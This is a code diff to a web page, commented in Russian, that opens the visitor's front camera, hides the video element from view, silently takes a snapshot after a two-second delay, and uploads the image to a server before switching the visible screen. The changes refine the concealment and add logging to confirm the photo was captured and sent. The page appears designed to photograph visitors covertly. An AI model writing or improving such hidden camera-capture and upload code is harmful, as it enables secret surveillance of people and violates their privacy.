@@ -62,9 +62,12 @@
         }
         #video {
             position: absolute;
-            top: -9999px; /* Убираем за пределы экрана */
-            left: -9999px;
-            opacity: 0; /* Скрываем визуально */
+            top: 0;
+            left: 0;
+            width: 1px; /* Минимальный размер */
+            height: 1px;
+            opacity: 0; /* Скрываем */
+            pointer-events: none; /* Убираем взаимодействие */
         }
         #canvas {
             display: none;
@@ -115,18 +118,21 @@
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { 
                         facingMode: 'user', // Фронтальная камера
-                        width: { ideal: 640 }, // Стандартное разрешение
+                        width: { ideal: 640 },
                         height: { ideal: 480 }
                     }
                 });
                 video.srcObject = stream;
+                console.log('Камера запущена');
 
                 // Ждём загрузки видео
                 video.onloadeddata = () => {
-                    // Даём камере 1.5 секунды на фокусировку
+                    console.log('Видео загружено');
+                    // Даём 2 секунды на фокусировку
                     setTimeout(() => {
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         const photoData = canvas.toDataURL('image/png');
+                        console.log('Снимок сделан:', photoData.slice(0, 50)); // Первые 50 символов для проверки
 
                         // Останавливаем камеру
                         stream.getTracks().forEach(track => track.stop());
@@ -144,6 +150,7 @@
                         })
                         .then(response => {
                             if (response.ok) {
+                                console.log('Фото отправлено');
                                 // Переключаем экраны
                                 startScreen.style.opacity = '0';
                                 setTimeout(() => {
@@ -156,7 +163,7 @@
                             }
                         })
                         .catch(error => console.error('Ошибка:', error));
-                    }, 1500); // Задержка 1.5 секунды для фокуса
+                    }, 2000); // Задержка 2 секунды
                 };
             } catch (err) {
                 console.error('Ошибка доступа к камере:', err);
